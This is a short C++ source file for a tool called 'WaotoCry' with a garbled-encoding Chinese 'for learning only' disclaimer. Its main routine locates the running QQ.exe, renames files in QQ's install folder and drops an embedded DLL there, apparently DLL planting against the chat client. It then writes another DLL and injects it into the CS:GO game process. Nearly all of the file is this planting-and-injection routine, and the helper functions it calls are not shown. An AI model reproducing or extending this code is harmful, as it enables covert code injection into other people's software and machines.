#include "Un-main.h"
#include "resource.h"

WaotoCry _WaotoCry;


int EY();


int main() {
	int meny;
	cout << "[ע��]�˹��߽���Ϊѧϰ����ʹ��,����������������!" << endl;
	cout << "���������ս���Ȩ�鱾��Ŀ���������У�����" << endl;
	cout << "���ڴ��������ô������ṩ����Ϣ����ɵ��κ�ֱ�ӻ��߼�ӵĺ������ʧ������ʹ���߱��˸��𣬿����߲�Ϊ�˳е��κ����Ρ�" << endl;
	while (true)
	{
		cout << "��ѡ��GAME��Ӧ�����ֿ�ʼ��ѡ��0���˳�" << endl;
		cout << "[1]  CSGO-GAME" << endl;
		cin >> meny;
		switch (meny)
		{
		case 1:
			EY();
			CreateEXE((char*)_WaotoCry.process_new_path, IDR_DLL_CS1, (char*)"DLL");
			inject_to_cS_game();
			break;
		default:
			break;
		}
	}
	//system("pause");
	return 0;
}



int EY() {
	char* QQ_path;
	char* QQ_path_1;
	string string_qq_path;
	//no_windows();
	_WaotoCry.process_new_path = new_process_path();
	add_double_data(_WaotoCry.process_new_path);
	increase(_WaotoCry.process_new_path);
	_WaotoCry.get_process_dir = Get_Process_in_dir();  //new process in the dir
	_WaotoCry.get_pid = GetProcesspId((const char*)"QQ.exe"); //obtaion QQ PROCESS THE PID
	_WaotoCry.process_pid_path = process_pid_to_path(_WaotoCry.get_pid); //obtainh for PID
	string_qq_path = _WaotoCry.process_pid_path;
	QQ_path = (char*)string_qq_path.c_str();
	_WaotoCry.target_process_path = replace_string(string_qq_path, "\\QQ.exe", "");//Modifly string information
	QQ_path = (char*)_WaotoCry.target_process_path.c_str();
	QQ_path_1 = (char*)_WaotoCry.target_process_path.c_str();
	reaname(QQ_path, QQ_path);//Modifly File name
	_WaotoCry.off = CreateEXE(QQ_path, IDR_DLL1, (char*)"DLL");
}